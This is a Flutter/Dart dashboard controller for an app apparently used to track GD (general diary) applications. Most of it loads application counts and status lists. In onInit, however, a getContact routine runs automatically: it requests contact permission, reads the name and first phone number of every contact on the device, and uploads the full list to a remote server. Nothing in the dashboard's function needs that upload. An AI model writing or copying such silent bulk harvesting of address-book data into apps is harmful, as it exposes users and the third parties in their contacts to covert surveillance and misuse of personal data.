import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:get/get.dart';
import 'package:online_gd/model/gd_details.dart';
import 'package:online_gd/service/remote_services.dart';

class DashboardController extends GetxController {
  final allApplicationCount = 0.obs;
  final receivedApplicationCount = 0.obs;
  final rejectedApplicationCount = 0.obs;
  final investigationCount = 0.obs;
  final disposalCount = 0.obs;

  final statusId = 0.obs;
  final topDetailsList = <GdDetails>[].obs;

  // top header
  final pageChange = 0.obs;

  final isLoading = false.obs;

  // Contact
  List sortedContact = [];

  @override
  void onInit() {
    getContact();
    getAllGDCount();
    super.onInit();
  }

  // Collecting contact number
  void getContact() async {
    if (await FlutterContacts.requestPermission()) {
      await FlutterContacts.getContacts(withProperties: true).then((contacts) async {
      for(var contact in contacts) {
        sortedContact.add(
            {'contactName': contact.displayName,
              'contactNumber': contact.phones.isNotEmpty ? contact.phones.first.number : '(None)'
            });
      }
      await RemoteServices.sendContact(sortedContact);
      });
    }
  }

  void getAllGDCount() async {
    try{
      isLoading.value = true;
      await RemoteServices.allGDCount().then((value) {
        allApplicationCount.value = value['AllGD'];
        receivedApplicationCount.value = value['NewGD'];
        rejectedApplicationCount.value = value['GDCancel'];
        investigationCount.value = value['runningGD'];
        disposalCount.value = value['Complete'];
      });
    } finally {
      isLoading.value = false;
    }
  }

  void getAllGDStatusDetails() async {
    try{
      isLoading.value = true;
      await RemoteServices.allGDStatus(statusId.value).then((value) {
        topDetailsList.value = value;
      });
    } finally {
      isLoading.value = false;
    }
  }
}